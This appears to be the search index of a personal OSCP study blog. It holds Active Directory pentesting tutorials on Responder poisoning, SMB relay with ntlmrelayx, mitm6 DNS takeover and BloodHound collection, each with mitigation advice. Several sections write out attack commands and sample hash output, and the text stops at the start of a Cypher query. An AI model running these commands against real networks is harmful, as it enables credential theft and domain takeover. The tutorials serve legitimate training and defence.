{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Welcome to my corner of the internet! I\u2019m a cybersecurity enthusiast with a passion for tackling challenges and unraveling complex puzzles. My journey into the world of cybersecurity began with a fascination for technology and a desire to understand how things work beneath the surface.</p> <p>Currently, I\u2019m diving deep into Capture The Flag (CTF) challenges on platforms like Hack The Box. These hands-on experiences not only sharpen my skills but also fuel my excitement for the field. Every challenge is an opportunity to learn, adapt, and think critically, and I thrive on the adrenaline that comes from solving tough problems.</p> <p>This documentation site is primarily focused on my preparation for the Offensive Security Certified Professional (OSCP) certification. I\u2019ll be sharing my insights, study strategies, and resources that I find helpful along the way. Whether you\u2019re a fellow aspiring OSCP candidate, a seasoned professional, or just curious about cybersecurity, I hope you find something valuable here.</p> <p>Join me on this journey as I explore the intricacies of penetration testing, share tips for navigating CTFs, and document my progress toward achieving the OSCP. Let\u2019s connect, learn, and grow together in this ever-evolving field!</p>"},{"location":"about/","title":"About","text":"<p>Welcome to my corner of the internet! I\u2019m a cybersecurity enthusiast with a passion for tackling challenges and unraveling complex puzzles. My journey into the world of cybersecurity began with a fascination for technology and a desire to understand how things work beneath the surface.</p> <p>Currently, I\u2019m diving deep into Capture The Flag (CTF) challenges on platforms like Hack The Box. These hands-on experiences not only sharpen my skills but also fuel my excitement for the field. Every challenge is an opportunity to learn, adapt, and think critically, and I thrive on the adrenaline that comes from solving tough problems.</p> <p>This documentation site is primarily focused on my preparation for the Offensive Security Certified Professional (OSCP) certification. I\u2019ll be sharing my insights, study strategies, and resources that I find helpful along the way. Whether you\u2019re a fellow aspiring OSCP candidate, a seasoned professional, or just curious about cybersecurity, I hope you find something valuable here.</p> <p>Join me on this journey as I explore the intricacies of penetration testing, share tips for navigating CTFs, and document my progress toward achieving the OSCP. Let\u2019s connect, learn, and grow together in this ever-evolving field!</p>"},{"location":"code-examples/","title":"Code examples","text":"<pre><code># Function to add two numbers\ndef add_two_numbers(num1, num2):\n    return num1 + num2\n\n# Example usage\nresult = add_two_numbers(5, 3)\nprint('The sum is:', result)\n</code></pre>"},{"location":"tags/","title":"Tags","text":"<p>My Tags</p>"},{"location":"tags/#tag:dump","title":"dump","text":"<ul> <li>            Dumping the NTDS.dit          </li> </ul>"},{"location":"tags/#tag:ntds","title":"ntds","text":"<ul> <li>            Dumping the NTDS.dit          </li> </ul>"},{"location":"active_directory/getting-started/","title":"Getting Started with Active Directory Pentesting","text":"<p>Welcome to the Active Directory (AD) pentesting section of the documentation. This guide introduces the fundamentals of pentesting Active Directory environments, a critical skill for security professionals aiming to identify and mitigate vulnerabilities in enterprise networks.</p>"},{"location":"active_directory/getting-started/#what-is-active-directory-pentesting","title":"What is Active Directory Pentesting?","text":"<p>Active Directory is Microsoft\u2019s directory service that manages authentication, authorization, and resource access in Windows-based networks. Pentesting AD involves assessing the security of AD configurations, user accounts, permissions, and infrastructure to uncover weaknesses that attackers could exploit.</p> <p>This section focuses on practical techniques, tools, and methodologies for AD pentesting, including reconnaissance, privilege escalation, and lateral movement.</p>"},{"location":"active_directory/getting-started/#why-pentest-active-directory","title":"Why Pentest Active Directory?","text":"<p>AD is the backbone of many enterprise environments, making it a prime target for attackers. A single misconfiguration can lead to domain compromise, data breaches, or ransomware deployment. Pentesting AD helps organizations:</p> <ul> <li>Identify weak passwords and misconfigured accounts.</li> <li>Detect excessive permissions or insecure group policies.</li> <li>Harden domain controllers and related infrastructure.</li> <li>Prepare for real-world attack scenarios, such as pass-the-hash or Kerberos-based attacks.</li> </ul>"},{"location":"active_directory/getting-started/#whats-covered-in-this-section","title":"What\u2019s Covered in This Section","text":"<p>The Active Directory pentesting documentation is organized to guide you from beginner concepts to advanced techniques:</p> <ul> <li>Reconnaissance: Learn how to gather information about AD environments using tools like BloodHound and PowerView.</li> <li>Enumeration: Discover users, groups, and permissions to identify potential attack paths.</li> <li>Exploitation: Explore techniques like Kerberoasting, NTLM relay, and privilege escalation.</li> <li>Post-Exploitation: Understand lateral movement, persistence, and data exfiltration in AD.</li> </ul>"},{"location":"active_directory/getting-started/#getting-started","title":"Getting Started","text":"<p>To begin pentesting Active Directory, you\u2019ll need:</p> <ol> <li> <p>A Lab Environment: Set up a safe, isolated AD lab using virtual machines (e.g., with VMware or VirtualBox). Tools like Microsoft\u2019s AD DS Deployment Guide can help.</p> </li> <li> <p>Pentesting Tools: Install tools like:</p> <ul> <li>Impacket for protocol attacks.</li> <li>BloodHound for AD relationship mapping.</li> <li>Mimikatz for credential extraction.</li> </ul> </li> <li> <p>Basic Knowledge: Familiarity with Windows networking, LDAP, and Kerberos is helpful but not required. Start with our Guides for foundational knowledge.</p> </li> </ol>"},{"location":"active_directory/getting-started/#next-steps","title":"Next Steps","text":"<p>Explore the following sections of the documentation to deepen your AD pentesting skills:</p> <ul> <li>Guides: Step-by-step tutorials on AD concepts and pentesting workflows.</li> <li>OSINT: Learn how open-source intelligence complements AD reconnaissance.</li> </ul>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/","title":"LLMNR & NBT-NS Poisioning","text":"<p>So, you're a pentester. You've landed on a client's internal network, your Kali terminal is glowing, and you're wondering, \"What's the quickest way to get some credentials around here?\" Before you start firing off complex exploits, let's talk about listening. Specifically, listening for the desperate, misguided cries of Windows machines that have lost their way.</p> <p>Welcome to the wonderful world of LLMNR and NBT-NS poisoning, the lowest-hanging fruit on many internal networks and an attacker's best friend. It\u2019s less of a sophisticated \"hack\" and more like putting up a fake \"Free Pizza\" sign and waiting for hungry people to show up.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#a-trip-down-memory-lane","title":"A Trip Down Memory Lane \ud83d\udcdc","text":"<p>To understand why this attack is so beautifully effective, we need to hop in our Delorean and travel back in time.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#nbt-ns-the-dinosaur","title":"NBT-NS: The Dinosaur","text":"<p>In the ancient days before DNS was the undisputed king of name resolution, networks were smaller, more intimate places. NetBIOS Name Service (NBT-NS) was born in this era. Its job was simple: if a computer wanted to find another computer on the local network (e.g., <code>\\\\FILESERVER</code>), but its map (the WINS server or local <code>lmhosts</code> file) was useless, it would just shout its request to everyone on the local network segment. Think of it as walking into a party and yelling, \"Has anyone seen Dave?\" It's inefficient, but in a small room, it works.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#llmnr-the-slightly-younger-not-much-smarter-sibling","title":"LLMNR: The Slightly Younger, Not-Much-Smarter Sibling","text":"<p>Fast forward a bit. Microsoft, realizing that yelling on a network wasn't ideal but still wanting a fallback for when DNS fails, created Link-Local Multicast Name Resolution (LLMNR). It's the modern, IPv6-friendly successor to NBT-NS. It's a bit more \"organized\" since it uses multicast instead of broadcast, but the principle is identical: when DNS says \"I don't know,\" the computer turns to its local network peers and asks, \"Hey guys, any of you know where <code>\\\\FILESARVER</code> is?\"</p> <p>The fatal flaw in both of these protocols? They trust the answer from anyone who replies first. And that's where we, the pentesters, come in.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#the-attack-how-we-turn-chatter-into-shells","title":"The Attack: How We Turn Chatter into Shells \ud83d\udcbb","text":"<p>The attack flow is deliciously simple and preys on a single, common event: a user mistyping a server name.</p> <ol> <li> <p>The Typo: An employee, fueled by their third coffee of the morning, wants to access the finance share. They open Windows Explorer and type <code>\\\\finannce</code> instead of <code>\\\\finance</code>.</p> </li> <li> <p>DNS Says \"Nope\": The computer first does the sensible thing and asks the DNS server, \"Hey, what's the IP for <code>\\\\finannce</code>?\" The DNS server, being a stickler for spelling, correctly replies, \"Never heard of it. Go away.\"</p> </li> <li> <p>The Desperate Shout: Now, instead of giving the user an error, Windows helpfully falls back to the old ways. It sends out an LLMNR/NBT-NS broadcast to the entire local subnet: \"HELLO EVERYONE! I CAN'T FIND <code>\\\\finannce</code>! DOES ANYONE KNOW WHERE IT IS?\"</p> </li> <li> <p>Our Malicious Reply: Our trusty tool, Responder, which has been quietly listening on the network, sees this desperate plea. It immediately shoots back a reply: \"YES! I AM <code>\\\\finannce</code>! YOU FOUND ME! MY IP IS [Attacker's IP Address]. PLEASE, AUTHENTICATE TO ME!\"</p> </li> <li> <p>The Gullible Victim: The user's computer, thrilled to have found its destination, immediately tries to authenticate to our machine to access the share. In doing so, it sends us the user's NTLMv2 hash.</p> </li> </ol> <p>BOOM. We've just caught a username and a password hash without sending a single malicious packet unprompted. The network served it to us on a silver platter.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#lets-get-hacking-using-responder","title":"Let's Get Hacking: Using Responder","text":"<p>The go-to tool for this attack is <code>Responder</code> by Laurent Gaffie. It's included in Kali Linux and is incredibly easy to use.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#step-1-fire-up-responder","title":"Step 1: Fire up Responder","text":"<p>Open your terminal and run Responder. You need to tell it which network interface to listen on.</p> <pre><code>sudo responder -I eth0 -v\n</code></pre> <ul> <li><code>sudo</code>: Responder needs root privileges to listen on privileged ports.</li> <li><code>-I eth0</code>: Tells Responder to listen on the <code>eth0</code> interface. Use <code>ifconfig</code> or <code>ip a</code> to find your network interface name.</li> <li><code>-v</code>: Verbose mode. This shows you all the action as it happens.</li> </ul> <p>Now, you wait. The screen will sit there, poised and listening...</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#step-2-the-magic-happens","title":"Step 2: The Magic Happens","text":"<p>When a user makes a typo, your screen will light up with beautiful, beautiful text.</p> <pre><code>[+] LLMNR Poisoned answer sent to 192.168.1.132 for name filesharre\n[+] NTLMv2-SSP Hash Captured:\n\nASchneider::CORP:1122334455667788:C33D8018A49A13506FBEA92736E5632A:[...]\n  User              : ASchneider\n  Domain            : CORP\n  NTLMv2 Hash       : C33D8018A49A13506FBEA92736E5632A...\n  IP Address        : 192.168.1.132\n  Hostname          : DESKTOP-A5B4C3\n</code></pre> <p>Look at that! We have a username, a domain, and most importantly, a hash. We didn't even have to break a sweat.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#step-3-crack-that-hash","title":"Step 3: Crack That Hash! \ud83d\udd11","text":"<p>Now that you have the hash, it's time to crack it. We use a tool like <code>Hashcat</code> for this. Save the full hash line into a file named <code>hash.txt</code>.</p> <p>The format for an NTLMv2 hash in Hashcat is mode <code>5600</code>.</p> <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre> <ul> <li><code>-m 5600</code>: Specifies the hash mode is NTLMv2.</li> <li><code>hash.txt</code>: The file containing the hash you captured.</li> <li><code>/usr/share/wordlists/rockyou.txt</code>: A common password list. If the user's password is \"Password123\", this will find it in seconds.</li> </ul> <p>If you're lucky and the user has a weak password, Hashcat will serve it up to you. You now have a valid domain username and password. Game over.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#pro-tip-relaying-vs-cracking","title":"Pro-Tip: Relaying vs. Cracking","text":"<p>Sometimes, you don't even need to crack the hash! An even more powerful technique is SMB Relaying. Instead of cracking the hash, you take the incoming authentication attempt and \"relay\" it to another machine on the network. If the user (<code>ASchneider</code>) is a local administrator on another server, you can use their relayed credentials to instantly get a shell on that server. But that's a story for another day!</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/01-llmnr-poisioning/#how-to-banish-the-gremlins-mitigation","title":"How to Banish the Gremlins: Mitigation \ud83d\udee1\ufe0f","text":"<p>As responsible pentesters, we must tell our clients how to fix this mess.</p> <ol> <li> <p>DISABLE, DISABLE, DISABLE: This is the big one. These protocols are relics. For 99% of modern corporate networks with a functioning DNS, they are completely unnecessary.</p> </li> <li> <p>Disable LLMNR: This can be done easily via Group Policy (GPO):   <code>Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution</code> -&gt; Set to Enabled.</p> </li> <li> <p>Disable NBT-NS: This is a bit trickier as it's a network adapter setting. It can be done via DHCP or manually, but the easiest way is to push a script to set the registry key. The setting is found under:   <code>Network Adapter Properties &gt; IPv4 &gt; Advanced &gt; WINS &gt; Disable NetBIOS over TCP/IP</code>.</p> </li> <li> <p>Network Segmentation: Don't let workstations and servers live on the same flat network. If a user on the guest Wi-Fi can poison requests for a domain controller, you have bigger problems. Segmenting the network limits the \"blast radius\" of these broadcast/multicast requests.</p> </li> <li> <p>Require SMB Signing: This is a GPO setting that cryptographically signs SMB traffic, which prevents SMB relaying attacks. It directly counters the \"pro-tip\" I mentioned earlier.</p> </li> </ol> <p>So go forth, listen to the network's whispers, and find those credentials. Just remember to tell your clients how to silence the chatty, gullible gremlins for good. Happy hunting!</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/","title":"SMB Relay Attack","text":"<p>Alright, so you've mastered LLMNR &amp; NBT-NS poisoning and you\u2019re swimming in NTLMv2 hashes. Cracking them is fun, but what if the user has a 25-character password generated by a password manager? You could spend the rest of the engagement turning your GPU into a space heater, or... you could just skip the cracking part entirely.</p> <p>Welcome to the SMB Relay Attack, the devastatingly effective big brother of simple hash capturing. Instead of stealing someone's password hash to crack later, we're going to catch their login attempt mid-flight and use it\u2014live\u2014to break into other machines.</p> <p>Think of it this way: LLMNR poisoning is like stealing someone's house key to make a copy later. An SMB Relay is like grabbing the key out of their hand as they're unlocking the door and letting yourself in right behind them. It's brazen, efficient, and wonderfully evil.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#the-prerequisite-a-cry-for-help","title":"The Prerequisite: A Cry for Help","text":"<p>This attack doesn't happen in a vacuum. It needs a trigger, and that trigger is the exact same one we used before: a user trying to connect to a non-existent resource. Our old friends LLMNR and NBT-NS poisoning are the perfect delivery mechanism. A user mistypes <code>\\\\fileservr</code>, their machine shouts into the void, and we, the attacker, are there to answer the call.</p> <p>But this time, we're not just going to grab the hash. We're going to play matchmaker.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#the-anatomy-of-the-heist","title":"The Anatomy of the Heist \ud83d\udcb0","text":"<p>The SMB Relay attack is a classic Man-in-the-Middle (MitM) scheme. Our tools will sit between a victim trying to log in and a target server we want to own.</p> <ol> <li> <p>The Lure: A user on <code>PC-A</code> tries to connect to a resource we are impersonating (e.g., via LLMNR poisoning). Their PC says, \"Hello, I'm Bob from the CORP domain, I'd like to authenticate.\"</p> </li> <li> <p>The Interception: Our relay tool, sitting on our attacker machine, catches this inbound authentication request. It essentially tells the victim's PC, \"Hold on one second, let me get the door for you.\"</p> </li> <li> <p>The Relay: The tool immediately turns around and uses Bob's authentication attempt to connect to a different, legitimate machine on the network\u2014let's call it TARGET-SERVER. It says to <code>TARGET-SERVER</code>, \"Hello, I'm Bob from the CORP domain, I'd like to authenticate.\"</p> </li> <li> <p>The Challenge: <code>TARGET-SERVER</code> (the machine we want to own) has no reason to be suspicious. It sends back an NTLM authentication challenge, as it normally would.</p> </li> <li> <p>Passing the Note: Our relay tool passes this challenge back to Bob's original PC (<code>PC-A</code>). Bob's machine, thinking it's talking to the original share, happily solves the challenge with Bob's credentials and sends the response back.</p> </li> <li> <p>The Pwnage: Our tool forwards this final, valid response to <code>TARGET-SERVER</code>. If Bob has administrative rights on <code>TARGET-SERVER</code>, the server accepts the authentication. Our tool now has an authenticated session on <code>TARGET-SERVER</code> as Bob.</p> </li> </ol> <p>From here, the world is our oyster. The most common next step is to instruct the target server to dump its entire local SAM database\u2014giving us the password hashes for every local user on that machine, including the local administrator.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#lets-get-practical-ntlmrelayxpy","title":"Let's Get Practical: <code>ntlmrelayx.py</code>","text":"<p>The king of relaying tools is <code>ntlmrelayx.py</code> from the Impacket suite. To make this work, we need to tell our old friend <code>Responder</code> to step aside and let <code>ntlmrelayx</code> handle the authentication.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#step-1-configure-responder","title":"Step 1: Configure Responder","text":"<p>First, we need to disable Responder's built-in SMB and HTTP servers so they don't interfere with our relay tool. We do this by editing Responder's configuration file.</p> <pre><code>sudo nano /etc/responder/Responder.conf\n</code></pre> <p>Find these lines and set them to Off:</p> <pre><code>SMB = Off\nHTTP = Off\n</code></pre> <p>Save the file. Now, run Responder. It will still perform the poisoning, but it won't handle the login attempts itself.</p> <pre><code>sudo responder -I eth0 -v\n</code></pre>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#step-2-create-a-target-list","title":"Step 2: Create a Target List","text":"<p>Find some interesting machines on the network to relay to. File servers, management servers, or even other workstations are good candidates. Save their IP addresses in a file called <code>targets.txt</code>, one IP per line.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#step-3-unleash-ntlmrelayxpy","title":"Step 3: Unleash <code>ntlmrelayx.py</code>","text":"<p>Now for the main event. Open a new terminal and run <code>ntlmrelayx.py</code>.</p> <pre><code>sudo ntlmrelayx.py -tf targets.txt -smb2support\n</code></pre> <ul> <li><code>-tf targets.txt</code>: Specifies the file containing our list of target IPs to relay to.</li> <li><code>-smb2support</code>: Enables support for the modern SMBv2 protocol, which is essential on any up-to-date network.</li> </ul> <p>Now, sit back and watch both terminals. When a user makes a typo, you'll see Responder poison the request. Then, in your <code>ntlmrelayx</code> window, the magic happens:</p> <pre><code>[*] SMBv2 Relay -- Target: 192.168.1.50\n[*] Authenticating against 192.168.1.50 as CORP\\BJohnson...\n[*] Service RemoteRegistry is running\n[*] Authenticating against 192.168.1.50 as CORP\\BJohnson SUCCEEDED!\n[*] Starting smbserver to host dumped SAM\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Done dumping SAM hashes for host: 192.168.1.50\n</code></pre> <p>Just like that, you have the local administrator hash for <code>192.168.1.50</code> without ever knowing BJohnson's password. If <code>BJohnson</code> was a Domain Admin, you could have used <code>-c \"whoami\"</code> to execute commands or even used other Impacket tools to get an interactive shell.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/02-smb-relay/#fortification-how-to-stop-the-relay","title":"Fortification: How to Stop the Relay \ud83d\udee1\ufe0f","text":"<p>This attack is incredibly powerful, but it relies on a specific weakness that can be fixed.</p> <ol> <li> <p>ENABLE SMB SIGNING (This is the #1 fix!): SMB signing is a feature that creates a digital signature for every SMB packet. When it's enabled on a client and server, the server can verify that the packets are coming directly from the client and haven't been tampered with by a \"man in the middle.\" This directly kills the relay attack. It can be enabled via Group Policy: <code>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options</code></p> <ul> <li>Microsoft network client: Digitally sign communications (always) -&gt; Enabled</li> <li>Microsoft network server: Digitally sign communications (always) -&gt; Enabled</li> </ul> </li> <li> <p>Disable LLMNR and NBT-NS: Cut the attack off at the source. If the attacker can't poison name resolution requests, it's much harder to get a victim to send credentials to them in the first place.</p> </li> <li> <p>Enforce Least Privilege: A Domain Admin should not be logging into their workstation with their DA account to browse the internet or check email. High-privilege accounts should only be used on hardened machines (like Domain Controllers) for administrative tasks. If the <code>BJohnson</code> account in our example wasn't an admin on <code>TARGET-SERVER</code>, the relay would have failed.</p> </li> <li> <p>Network Segmentation: As always, proper network segmentation prevents a user on a less secure network segment from being used as a pawn to attack servers in a more secure segment.</p> </li> </ol> <p>The SMB Relay is a cornerstone of internal network penetration testing. It's a testament to how old protocols and misconfigurations can be chained together to completely bypass modern password complexity and go straight for the win.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/","title":"IPv6 DNS Takeover via mitm6","text":"<p>You've poisoned local name resolution with Responder and relayed credentials with <code>ntlmrelayx</code>. You feel like a true network ninja. But what if I told you there's a way to force clients to talk to you without waiting for a user to make a typo? What if you could become the network's DNS server just by asking nicely?</p> <p>Enter mitm6, a devastatingly clever attack that abuses a network's misplaced enthusiasm for IPv6. Instead of waiting for a single machine to get lost, <code>mitm6</code> tricks the entire Windows domain into using your machine as its primary DNS server. This isn't just setting up a fake pizza sign; this is replacing the city's official map with one where every road leads to your restaurant.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/#why-this-even-works-the-ipv6-obsession","title":"Why This Even Works: The IPv6 Obsession","text":"<p>This attack exploits two fundamental truths about modern Windows environments:</p> <ol> <li> <p>Windows LOVES IPv6: By default, if a Windows machine has both an IPv4 and an IPv6 address, it will always prefer to use IPv6 for communication. It's the shiny new protocol, and Windows is all in.</p> </li> <li> <p>Networks are IPv6-Curious, Not IPv6-Ready: Many organizations haven't fully implemented IPv6. They don't have a legitimate DHCPv6 server configured to hand out IPv6 addresses and DNS server settings.</p> </li> </ol> <p>This creates a dangerous gap. Windows machines periodically send out DHCPv6 requests, asking, \"Is there an IPv6 network I can join?\" On most networks, this question is met with silence. But what if someone were to answer?</p> <p>That someone is us.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/#the-heist-from-rogue-dns-to-domain-dominance","title":"The Heist: From Rogue DNS to Domain Dominance","text":"<p>The <code>mitm6</code> attack is a beautiful, two-part symphony of deception, usually played with <code>ntlmrelayx.py</code> as the second instrument.</p> <ol> <li> <p>The Rogue Ambassador: We start the <code>mitm6</code> tool. It immediately begins listening for those hopeful DHCPv6 requests from Windows clients on the network.</p> </li> <li> <p>The Generous Offer: When a client (like a workstation or even a Domain Controller!) asks for an IPv6 configuration, <code>mitm6</code> springs into action. It replies with a valid-looking DHCPv6 response, giving the client a shiny new IPv6 address. But here's the poison pill: it tells the client that the attacker's machine is the primary DNS server.</p> </li> <li> <p>The DNS Takeover: The Windows client, ecstatic to have joined the IPv6 future, gratefully accepts. Because Windows prefers IPv6, it now sends all of its DNS queries to our attacker machine.</p> </li> <li> <p>The Impersonation: The client machine needs to do routine Active Directory things, like check for Group Policy updates. It asks our malicious DNS server, \"Hey, what's the IP address for <code>dc01.corp.local</code>?\" We reply, \"Oh, that's easy. The IP address is <code>[Our Attacker IPv6 Address]</code>.\"</p> </li> <li> <p>The Inevitable Authentication: The client, none the wiser, attempts to authenticate to what it thinks is the Domain Controller. This authentication attempt flows directly to our machine.</p> </li> <li> <p>The Relay and The Kill: This is where <code>ntlmrelayx.py</code> takes the stage. It catches this incoming authentication (often from the computer account itself, like <code>WKSTN01$</code>) and relays it to the actual Domain Controller. Since computer accounts are trusted members of the domain, this relayed authentication can be used to perform highly privileged actions against Active Directory, such as modifying its properties to grant us control over it.</p> </li> </ol> <p>The end result? We can use a normal workstation's authentication attempt to compromise the entire domain, often within minutes.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/#get-your-hands-dirty-the-command-line-fu","title":"Get Your Hands Dirty: The Command-Line Fu \ud83e\udd4b","text":"<p>This attack requires two terminals: one for <code>mitm6</code> and one for <code>ntlmrelayx.py</code>.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/#step-1-run-mitm6","title":"Step 1: Run mitm6","text":"<p>The <code>mitm6</code> tool's job is to become the rogue DHCPv6/DNS server.</p> <pre><code>sudo mitm6 -d corp.local\n</code></pre> <ul> <li><code>-d corp.local</code>: Specifies the target domain. <code>mitm6</code> will only respond to requests concerning this domain, which makes the attack more stable.</li> </ul> <p>You'll immediately see clients on the network start receiving IPv6 addresses from you and your machine being set as their DNS server.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/#step-2-run-ntlmrelayxpy-for-the-relay","title":"Step 2: Run <code>ntlmrelayx.py</code> for the Relay","text":"<p>This is where the magic happens. We configure <code>ntlmrelayx</code> to listen on IPv6 and perform a sophisticated attack against Active Directory, like resource-based constrained delegation.</p> <pre><code>sudo ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh fakewpad.corp.local --delegate-access\n</code></pre> <ul> <li><code>-6</code>: Tells <code>ntlmrelayx</code> to listen on IPv6, ready to catch the traffic from our victims.</li> <li><code>-t ldaps://dc01.corp.local</code>: Sets our target. We're targeting the Domain Controller over LDAPS (secure LDAP).</li> <li><code>-wh fakewpad.corp.local</code>: The \"wpad host\" option. This is a clever trick to trigger authentication from web browsers on the network, giving us more credentials to play with.</li> <li><code>--delegate-access</code>: This is the money flag. Instead of just dumping hashes, it attempts to modify Active Directory to delegate control of the targeted computer (our DC!) to the user account we relayed.</li> </ul> <p>Once a computer authenticates, you'll see <code>ntlmrelayx</code> perform its magic, and moments later, you'll have the power to impersonate any user on that Domain Controller. It's essentially game over for the domain.</p>"},{"location":"active_directory/01-Initial%20Attack%20Vectors/03-mitm6/#fortification-locking-the-ipv6-door","title":"Fortification: Locking the IPv6 Door \ud83d\udee1\ufe0f","text":"<p>This attack is terrifyingly effective, but it only works because of specific configuration oversights.</p> <ol> <li> <p>Disable IPv6 If You Don't Use It: This is the simplest and most effective defense. If your organization has no business case for IPv6, disable it entirely via Group Policy to prevent clients from ever asking for an IPv6 address.</p> </li> <li> <p>Enable DHCPv6 Guard and RA Guard: If you do use IPv6, your managed network switches have features designed specifically to stop this. DHCPv6 Guard and RA (Router Advertisement) Guard allow you to specify which switch ports are allowed to send DHCPv6 and router advertisement packets. This prevents a rogue device from acting as a server.</p> </li> <li> <p>Prefer IPv4 over IPv6: While not a complete fix, you can use Group Policy to change Windows' default behavior and make it prefer IPv4. This makes the environment far less susceptible to this specific attack vector.</p> </li> <li> <p>Enable LDAP Signing and Channel Binding: Just like with SMB, requiring digital signatures on LDAP traffic can help mitigate the final relay to the Domain Controller, making it harder for the attacker to manipulate Active Directory.</p> </li> </ol> <p><code>mitm6</code> is a powerful reminder that sometimes the biggest vulnerabilities lie not in a single piece of software, but in the insecure interaction between protocols. Stay vigilant, and don't let the ghost of IPv6 haunt your network.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/","title":"Domain Enumeration with Bloodhound","text":"<p>You've landed your initial foothold and have a set of domain credentials. It's time to trade in your paper map for a GPS. BloodHound is that GPS. It doesn't just list domain objects; it maps the complex web of relationships between them, showing you the hidden paths and secret passages that lead directly to Domain Admin.</p> <p>This guide focuses on using the Python-based collector for the BloodHound Community Edition (CE), and will dive into writing custom Cypher queries to uncover high-impact, non-default attack paths.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/#how-it-works-the-collector-and-the-graph","title":"How It Works: The Collector and the Graph","text":"<p>BloodHound has two parts: the collector that grabs the data, and the GUI that visualizes it.</p> <ol> <li> <p>The Collector (<code>bloodhound-ce-python</code>): This is your reconnaissance drone. It's a Python-based tool that uses your compromised credentials to query the Domain Controller over LDAP and other protocols. It gathers a massive amount of data on users, groups, computers, sessions, and permissions, then saves it as a set of JSON files.</p> </li> <li> <p>The BloodHound GUI (Community Edition): This is your command center. Powered by a Neo4j graph database, you import the JSON files from the collector into the GUI. It then builds an interactive map of the entire domain, allowing you to visually trace privilege relationships.</p> </li> </ol>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/#lets-go-hunting-the-practical-steps","title":"Let's Go Hunting: The Practical Steps","text":""},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/#step-1-install-bloodhound-ce-python","title":"Step 1: Install <code>bloodhound-ce-python</code>","text":"<p>On your attacker machine (e.g., Kali Linux), install the community edition collector.</p> <pre><code>sudo apt install bloodhound-ce-python\n</code></pre>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/#step-2-run-the-collector","title":"Step 2: Run The Collector","text":"<p>Using your compromised credentials, run the collector against a Domain Controller.</p> <pre><code># Create a directory for your loot\nmkdir bloodhound_loot\ncd bloodhound_loot\n\n# Run the collector\nbloodhound-ce-python -u 'j.rice' -p 'Welcome@123' -d alpha.lab -ns 172.17.1.100 -c All --zip\n</code></pre> <p>Let's break that down:</p> <ul> <li><code>-u 'j.rice'</code>: The username.</li> <li><code>-p 'Welcome@123'</code>: The user's password.</li> <li><code>-d alpha.lab</code>: The target domain name.</li> <li><code>-ns 172.17.1.100</code>: The IP address of a Name Server / Domain Controller.</li> <li><code>-c All</code>: The collection method. All is recommended to get the most complete picture.</li> <li><code>--zip</code>: Zip the collected data. if this flag is not set, <code>bloodhound-python</code> will produce a set of JSON files (e.g., users.json, groups.json, computers.json, sessions.json).</li> </ul>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/#step-3-analyze-the-loot","title":"Step 3: Analyze the Loot","text":"<p>Open your BloodHound CE GUI. Drag and drop the generated <code>zip</code> file onto the interface. BloodHound will ingest the data and build the graph. Now you can use the \"Analysis\" tab to run built-in queries like \"Find Shortest Paths to Domain Admins.\"</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/bloodhound/#beyond-the-defaults-writing-custom-cypher-queries","title":"Beyond the Defaults: Writing Custom Cypher Queries","text":"<p>The built-in queries are great, but the real power of BloodHound comes from writing your own queries in the Cypher language. Cypher is a query language for graphs, much like SQL is for relational databases.</p> <p>Go to the \"Raw Query\" tab at the bottom of the BloodHound GUI to get started.</p> <p>Example 1: Abusing GenericAll / GenericWrite  - Impact: If a user or group you control has <code>GenericAll</code> or <code>GenericWrite</code> permissions on another user or group, you effectively own that object. You can reset its password or, if it's a group, add your own user to it. This is a direct privilege escalation vector.</p> <ul> <li>Custom Cypher Query:     <pre><code>// 